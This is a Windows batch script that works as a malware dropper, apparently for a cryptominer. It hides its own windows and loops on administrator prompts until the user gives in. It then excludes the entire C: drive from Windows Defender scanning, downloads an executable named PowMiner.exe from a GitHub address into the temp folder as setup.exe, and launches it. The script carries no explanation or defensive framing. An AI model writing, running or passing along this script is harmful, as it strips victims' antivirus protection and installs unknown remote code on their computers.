@echo off
if not "%1"=="MINIMIZED" (
    start "" /min cmd /c "%~f0" MINIMIZED %*
    exit /b
)

net session >nul 2>&1
if %errorLevel% == 0 (
    goto :runAsAdmin
) else (
    goto :requestElevation
)

:requestElevation
    set "originalPID="
    for /f "tokens=2 delims=;=" %%A in ('wmic process where "name='cmd.exe' and commandline like '%%%~nx0%%'" get processid^, commandline /format:list ^| find "MINIMIZED"') do (
        if not defined originalPID set "originalPID=%%A"
    )
    
    set "batchPath=%~f0"
    set "batchArgs=MINIMIZED KILLPARENT %originalPID%"
    
    :tryElevate
    echo Requesting administrator privileges (window will minimize)...
    powershell -noprofile -windowstyle hidden -command "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
    if %errorLevel% == 0 (
        timeout /t 2 >nul
        exit
    ) else (
        timeout /t 1 >nul
        goto :tryElevate
    )

:runAsAdmin
    if /i "%~2"=="KILLPARENT" (
        taskkill /PID %~3 /F >nul 2>&1
    )
    
    setlocal
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
    set "exeFile=%TEMP%\setup.exe"
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/xalo55662773/PoW-Miner/raw/refs/heads/main/PowMiner.exe', '%exeFile%')"
    start "" "%exeFile%"
    endlocal
    exit